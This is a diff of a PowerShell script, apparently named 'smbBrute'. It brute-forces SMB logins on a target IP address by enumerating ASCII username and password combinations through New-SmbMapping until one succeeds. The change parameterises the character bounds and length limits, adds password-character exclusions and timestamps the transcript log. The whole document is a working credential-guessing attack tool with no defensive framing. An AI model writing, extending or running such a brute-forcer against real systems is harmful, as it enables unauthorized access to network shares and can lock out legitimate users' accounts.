@@ -1,18 +1,18 @@
-﻿param ($IPAddr = $(throw "Need IP Address"))
-# TODO: Add params for Max Length etc.
+﻿param (
+  [string]$IPAddr = $(throw "Need IP Address"),
+  [int] $lb =33, # lower bound
+  [int] $ub =126, # upper bound
+  [int] $ml =1, # max length
+  [int] $mli =1, # max length increment
+  # Usernames can not contain   / \ [ ] : ; | = , + * ? < > %
+  [int[]] $uc = (34, 47, 92, 91, 93, 58, 59, 124, 61, 44, 43, 42, 63, 60, 62, 37), # username constraints , chars that cant be used
+  [int[]] $pc = 1 .. 31 #password constraints , chars that cant be used
+) # TODO: Try - catch blocks
 
 # TODO: Add output file types XML, TXT, EXCEL
-Start-Transcript -path output.txt # TODO: Add timestamp
+Start-Transcript -path "smbBrute_$(get-date -f dd.MM.yyyy_HH.mm.ss).txt"
 
-# TODO: Just checks ASCII since the letters are the most used, for more Unicode values a parameter can be added
-$LastASCIINum = 126 
-$FirstASCIINum = 33
-$MaxLength = 1 
 $OldMaxLength = 0
-$MaxLengthInc = 1 # Incrementation value to update the maximum length for username and password
-
-# Usernames can not contain   / \ [ ] : ; | = , + * ? < > %
-$avoid =  34, 47, 92, 91, 93, 58, 59, 124, 61, 44, 43, 42, 63, 60, 62, 37
 
 function updateList{
 param ([int[]]$list, [bool] $isUsername)
@@ -20,18 +20,15 @@ param ([int[]]$list, [bool] $isUsername)
 for ($i = $list.Length-1; $i -ge 0 ; $i--){
     $list[$i] ++
 
-    if ( $isUsername -and $avoid -contains $list[$i]){
+    if ( ($isUsername -and $uc -contains $list[$i]) -or (!$isUsername -and $pc -contains $list[$i])){
         $i++ #process again
     }
-    elseIf ($list[$i] -eq 1 ){ #if it was null
-        $list[$i] = $FirstASCIINum - 1
-    }
-    elseIf ( $list[$i] -gt $LastASCIINum ){
+    elseIf ( $list[$i] -gt $ub ){
         if ($i -ne 0 ){
-            $list[$i] = $FirstASCIINum
+            $list[$i] = $lb
         }
         else{
-            [int[]]$list2 = ,$FirstASCIINum * ($list.Length+1)  # Increase the length and continue
+            [int[]]$list2 = ,$lb * ($list.Length+1)  # Increase the length and continue
             return $list2
         }
     }
@@ -41,7 +38,6 @@ for ($i = $list.Length-1; $i -ge 0 ; $i--){
 }
 return $list
 }
-
 function createString{
 param ([int[]]$list)
 $out = $null;
@@ -50,10 +46,9 @@ $out = $null;
    }
    return $out
 }
-
 function brute {
 
-[int[]]$userPtr =  $FirstASCIINum # username can not be space
+[int[]]$userPtr =  $lb # username can not be space
 [int[]]$passPtr =  0 # password can be null
 $user = createString $userPtr #changes to String
 $pass = createString $passPtr #changes to String
@@ -62,9 +57,9 @@ $Result = $null
 #Continue till find a match
 :outer while ($true) {
 
-while ($userPtr.Length -le $MaxLength) {
+while ($userPtr.Length -le $ml) {
 
-    while ($passPtr.Length -le $MaxLength){ #check pass for this user
+    while ($passPtr.Length -le $ml){ #check pass for this user
         $Result = New-SmbMapping -RemotePath $IPAddr -UserName $user -Password $pass -EA SilentlyContinue
            # TODO: Check if the server is on
         if ( $Result -ne $null ){
@@ -81,18 +76,17 @@ while ($userPtr.Length -le $MaxLength) {
         $passPtr =  0 # needs to start from the beginning
     }
     else {
-        $passPtr =   @($FirstASCIINum) * ($OldMaxLength+1)
+        $passPtr =   @($lb) * ($OldMaxLength+1)
     }
     $pass = createString $passPtr
 }
-$OldMaxLength = $MaxLength
-$MaxLength += $MaxLengthInc
-$userPtr = $FirstASCIINum
+$OldMaxLength = $ml
+$ml += $mli
+$userPtr = $lb
 $user = createString $userPtr
-$passPtr =  @($FirstASCIINum) * ($OldMaxLength+1) # No need to check previous with the same usernames, no need to check null anymore since there are other characters
+$passPtr =  @($lb) * ($OldMaxLength+1) # No need to check previous with the same usernames, no need to check null anymore since there are other characters
 $pass = createString $passPtr
 }
 }
-
 brute
 Stop-Transcript
